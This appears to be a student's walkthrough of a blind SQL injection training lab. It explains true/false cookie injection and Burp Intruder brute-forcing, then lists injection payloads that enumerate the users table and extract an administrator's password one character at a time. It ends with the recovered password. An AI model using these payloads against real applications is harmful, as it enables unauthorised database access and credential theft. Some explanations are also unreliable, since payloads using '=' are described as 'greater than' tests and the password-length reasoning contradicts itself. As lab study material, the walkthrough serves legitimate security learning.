## How to determine whether web app has blind SQLi vulnerability or not

- Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:
```sql 
Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4
```

- When a request containing a `TrackingId` cookie is processed, the application determines whether this is a known user using a SQL query like this:
```sql 
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
- ***This query is vulnerable to SQL injection***, but the results from the query are not returned to the user.
- If it returns data (because a recognized `TrackingId` was submitted), then a "Welcome back" message is displayed within the page.
- This behavior is enough to be able to exploit the blind SQL injection vulnerability.

## How the above works
- suppose that two requests are sent containing the following `TrackingId` cookie values in turn:
```sql 
…xyz' AND '1'='1 
…xyz' AND '1'='2
```
- The first of these values will cause the query to return results, because the injected `AND '1'='1` condition is true, and so the "Welcome back" message will be displayed.
- Whereas the second value will cause the query to not return any results, because the injected condition is false, and so the "Welcome back" message will not be displayed.
- This allows us to determine the answer to any single injected condition, and so extract data one bit at a time.

- For example, suppose there is a table called `Users` with the columns `Username` and `Password`, and a user called `Administrator`. We can systematically determine the password for this user by sending a series of inputs to test the password one character at a time. To do this, we start with the following input:
```sql
xyz' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator') = 'm'--
```
- This returns the "Welcome back" message, indicating that the injected condition is true, and so the first character of the password is greater than `m`.

- Next, we send the following input:
```sql 
xyz' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator') = 't'--
```
- This does not return the "Welcome back" message, indicating that the injected condition is false, and so the first character of the password is not greater than `t`.

- Eventually, we send the following input, which returns the "Welcome back" message, thereby confirming that the first character of the password is `s`:
```sql 
xyz' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator') = 's'--
```

- We can continue this process to systematically determine the full password for the `Administrator` user.

## Steps to solve Lab-1
### Desc - Blind SQL injection with conditional responses

1. First confirm that the parameter(tracking-id) is vulnerable to blind SQLi
Vulnerable parameter - tracking cookie(tracking-id)
**Below is how the backend query looks like when it checks the user is known or not known** ->
```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'Bs2vlGFAYY1bH5PO'
```
- if this tracking id exists -> query returns value -> Welcome back(for this lab but differ in real world)
  If this tracking id doesn't exist -> query returns nothing -> no Welcome back message(for this lab)

2. To fully confirm that it is vulnerable to blind based SQLi, we need to perform true and false use case. So that we can take out administrator password. For that we need to perform below query as follows:

In the backend the below SQL query looks like for true use case:
```sql
SELECT tracking-id FROM tracking-table WHERE trackingId = 'Bs2vlGFAYY1bH5PO'' and 1=1--
```
--> True --> Welcome back(message in the web app)
Below performing on burp:
![[blind_SQL_injection_conditional_responses1.png]]

In the backend the below SQL query looks like for false use case:
```sql 
SELECT tracking-id FROM tracking-table WHERE trackingId = 'Bs2vlGFAYY1bH5PO'' and 1=0--
```
--> False --> No Welcome back(message in the web app) 
Below performing on burp:
![[blind_SQL_injection_conditional_responses2.png]]

3. Asking the database that, do you have users table?
- For that we use the below query:
```sql
SELECT tracking-id FROM tracking-table WHERE trackingId = 'Bs2vlGFAYY1bH5PO'' and (SELECT 'x' FROM users LIMIT 1) = 'x'--
```
- Below performing on burp:
![[blind_SQL_injection_conditional_responses3.png]]
**Result** - Users table is present in the database.

4. Asking the database that, do you have a user named 'administrator'?
- For that we use the below query:
```sql
SELECT tracking-id FROM tracking-table WHERE trackingId = 'Bs2vlGFAYY1bH5PO'' and (SELECT username FROM users where username='administrator') = 'x'--
```
- Below performing on burp:
![[blind_SQL_injection_conditional_responses4.png]]
**Result** - administrator user is exist in database because welcome back message is still there.

5. Enumerate the password length of administrator.
	1. Asking the database, the length of password of administrator by below SQL query:
		```sql
		SELECT tracking-id FROM tracking-table WHERE trackingId =    'Bs2vlGFAYY1bH5PO'' and (SELECT username FROM users where username='administrator' and LENGTH(password)>1) = 'administrator'--
```
	2. Below performing on burp:
	   ![[blind_SQL_injection_conditional_responses5.png]]

	3. Now, we are going to perform brute force and for that we send the Repeater Raw data to intruder.
		![[blind_SQL_injection_conditional_responses6.png]]

	4. In the intruder, we clear positions.
		![[blind_SQL_injection_conditional_responses7.png]]

	5. Then add the position that you want to brute force to
		![[blind_SQL_injection_conditional_responses8.png]]

	6. Then add the payload type, starting, ending of brute force attack.
		![[blind_SQL_injection_conditional_responses9.png]]

	7. Brute force result:
		![[blind_SQL_injection_conditional_responses10.png]]
		**Result** - password is exactly 20 characters because in query we check whether the password is greater than 20.

6. Enumerating the password characters of administrator:
	1. Checking the password first character of administrator by below query
	```sql
	SELECT tracking-id FROM tracking-table WHERE trackingId =    'Bs2vlGFAYY1bH5PO'' AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator') = 'a'--
```

	2. Performing on burp:
		![[blind_SQL_injection_conditional_responses11.png]]
		- After that click on "Payloads" button and then see below.

	3. Selecting the "Payloads" in intruder:
	   ![[blind_SQL_injection_conditional_responses12.png]]

	4. After performing the attack
		![[blind_SQL_injection_conditional_responses13.png]]
		**Result** - 'y' is the first character in administrator password.

	5. Now, we are going to check second character from the below sql query:
	   ```sql
	   SELECT tracking-id FROM tracking-table WHERE trackingId =    'Bs2vlGFAYY1bH5PO'' AND (SELECT SUBSTRING(password, 2, 1) FROM users WHERE username='administrator') = 'a'--
```
- But instead of doing this 20 times(becoz password length is 20), we just change the "Attack type" from "Sniper" to "Cluster bomb".
![[blind_SQL_injection_conditional_responses14.png]]

6. Now, we are going to set the first payload:
	![[blind_SQL_injection_conditional_responses15.png]]

7. Now, we are going to set the second payload:
![[blind_SQL_injection_conditional_responses16.png]]

8. Now, we are going to set "Grep" option to "Welcome back" so that we can sort out every response.
![[blind_SQL_injection_conditional_responses17.png]]

9. Now, remember to sort the "welcome back" field on the basis of "Payload1" field.
![[blind_SQL_injection_conditional_responses18.png]]
**Result** - password is "5ywkeecbw9qfs127bprb"